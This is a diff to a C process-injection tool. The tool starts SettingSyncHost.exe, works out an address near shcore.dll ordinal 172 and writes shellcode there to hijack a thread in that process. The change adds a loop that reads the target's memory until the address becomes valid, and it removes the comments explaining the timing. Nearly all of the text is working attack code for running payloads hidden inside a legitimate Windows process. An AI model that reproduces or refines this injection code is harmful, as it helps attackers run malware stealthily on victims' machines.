@@ -8,7 +8,7 @@
 			
 			- Load shcore.dll to calculate the thread's entry
 			- Create "SettingSyncHost.exe -Embedding" Process
-			- Wait for ~ 5 ms ~ just make sure that the newly created process loads shcore.dll		[NOTE ON THIS LATER]
+			- BruteForce the address calculated (stop when its valid)
 			- suspend the process
 			- inject the payload to the calculated address
 			- resume the process
@@ -22,7 +22,8 @@
 
 #define TARGET_PROCESS_NAME				L"SettingSyncHost.exe -Embedding"
 #define ORDINAL172						172					
-#define WAIT_TIME						5	// MAX : 16 - MIN : 1  
+#define MAX_WAIT						2500
+#define WAIT_TIME						0.1	
 
 
 
@@ -123,6 +124,43 @@ BOOL InjectShellcodeAtOrdinal172(HANDLE hProcess, PVOID pAddress, PBYTE Shellcod
 
 
 
+BOOL BruteForceAddress(HANDLE hProcess, PVOID pAddress) {
+
+	PBYTE	lpBuffer				[MAX_PATH];
+	SIZE_T	lpNumberOfBytesRead		= NULL,
+			sCounter				= NULL;
+
+
+	while (TRUE){
+
+		if (ReadProcessMemory(hProcess, pAddress, lpBuffer, MAX_PATH, &lpNumberOfBytesRead)) {
+			printf("[+] Brute Forcing Address : 0x%p Succeeded After : %ld Tries \n", pAddress, sCounter);
+			return TRUE;
+		}
+
+		// when the address does not exist yet, keep running 
+		if (GetLastError() == ERROR_PARTIAL_COPY) {			
+			WaitForInputIdle(hProcess, WAIT_TIME);
+			sCounter++;
+			if (sCounter > MAX_WAIT) {
+				// timeout
+				break;
+			}
+			continue;
+		}
+		// if the error was something else
+		else{
+			wprintf(L"[!] ReadProcessMemory Failed With Error : %d \n", GetLastError());
+			break;
+		}
+
+	}
+
+	return FALSE;
+}
+
+
+
 
 int main() {
 
@@ -156,39 +194,20 @@ int main() {
 		return -1;
 	}
 
-	/*
-		this is a very important step, here we wait for the modules to be loaded, 
-		we are aiming for shcore.dll to be in memory ...
-
-		if we didnt wait enough, shcore.dll might not even be loaded, so the calculated address
-		wont be actually found .
-
-		else if we waited for a long time, we might miss the chance to hijack the execution - 
-		the thread at ordinal 172 + 0x100 is already executed - so injecting the payload then,
-		wont work .
-
-	*/
-
-	WaitForInputIdle(hProcess, WAIT_TIME);
+	if (!BruteForceAddress(hProcess, pAddress)) {
+		printf("[!] BruteForce Failed Or Timed Out\n");
+		return -1;
+	}
 
 	DebugActiveProcess(dwProcessId);
 
 	if (!InjectShellcodeAtOrdinal172(hProcess, pAddress, rawData, sizeof(rawData))) {
-		/*
-			if this function failed with error : 487 ( ERROR_INVALID_ADDRESS ), 
-			then we didnt waited enough and shcore.dll isnt yet in memory .
-		*/
 		return -1;
 	}
 
 	printf("[+] Payload Injected To 0x%p \n", pAddress);
 	
 	DebugActiveProcessStop(dwProcessId);
-
-	/*
-		if nothing happened here, we waited more than we should and the thread is already running .
-	*/
-
 
 
 	system("PAUSE");
